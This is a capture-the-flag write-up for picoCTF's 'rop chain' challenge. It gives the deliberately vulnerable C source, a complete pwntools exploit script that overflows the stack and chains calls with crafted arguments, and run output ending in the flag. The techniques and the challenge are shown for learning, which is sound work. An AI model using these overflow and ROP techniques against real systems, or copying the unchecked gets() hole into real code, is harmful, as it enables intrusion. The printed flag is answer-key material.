# rop chain
Binary Exploitation, 350 points

## Description:
> Can you exploit the following program and get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFSIZE 16

bool win1 = false;
bool win2 = false;


void win_function1() {
  win1 = true;
}

void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
  }
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}

```

## Solution:

We need to take over the stack using the buffer overflow in `vuln`, and use it to direct the flow execution to `win_function1`, then `win_function2` and finally `flag`.
`win_function2` and `flag` need to be called with appropriate arguments in order to print the flag.

pwntools makes building a ROP chain pretty straightforward:
```python
from pwn import *
import argparse
import os

EXECUTABLE = "rop"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d/"
SSH_SERVER = "2018shell3.picoctf.com"

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p

def send_payload(proc, payload):
    proc.sendlineafter("Enter your input> ", payload)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
	os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
	proc = process(get_process_path())
	payload = cyclic(128)
	send_payload(proc, payload)
	proc.wait()
	offset = cyclic_find(proc.corefile.eip)
	log.info("Overflow offset: {}".format(offset))
	return offset


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

e = ELF(get_process_path())
context.binary = e.path

log.info("Address of win_function1(): 0x{:02X}".format(e.symbols["win_function1"]))
log.info("Address of win_function2(): 0x{:02X}".format(e.symbols["win_function2"]))
log.info("Address of flag(): 0x{:02X}".format(e.symbols["flag"]))

r = ROP(e)
r.win_function1()
r.win_function2(0xBAAAAAAD)
r.flag(0xDEADBAAD)

print "ROP:"
print r.dump()

offset = get_overflow_offset()

p = get_process(args.ssh_user)
payload = fit({offset: str(r)})
send_payload(p, payload)
print p.recvall()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/rop_chain# python exploit.py --ssh_user=$pico_ssh_user
[*] '/media/sf_CTFs/pico/rop_chain/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Address of win_function1(): 0x80485CB
[*] Address of win_function2(): 0x80485D8
[*] Address of flag(): 0x804862B
[*] Loaded cached gadgets for './rop'
ROP:
0x0000:        0x80485cb win_function1()
0x0004:        0x80485d8 win_function2(0xbaaaaaad)
0x0008:        0x804840d <adjust @0x10> pop ebx; ret
0x000c:       0xbaaaaaad arg0
0x0010:        0x804862b flag(0xdeadbaad)
0x0014:           'faaa' <return address>
0x0018:       0xdeadbaad arg0
[+] Starting local process './rop': pid 1792
[*] Process './rop' stopped with exit code -11 (SIGSEGV) (pid 1792)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/rop_chain/core.1792'
    Arch:      i386-32-little
    EIP:       0x61616168
    ESP:       0xffa79340
    Exe:       '/media/sf_CTFs/pico/rop_chain/rop' (0x8048000)
    Fault:     0x61616168
[*] Overflow offset: 28
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d/rop' on 2018shell3.picoctf.com: pid 2462245
[+] Receiving all data: Done (41B)
[*] Stopped remote process 'rop' on 2018shell3.picoctf.com (pid 2462245)
picoCTF{rOp_aInT_5o_h4Rd_R1gHt_536d67d1}
```

The flag: picoCTF{rOp_aInT_5o_h4Rd_R1gHt_536d67d1}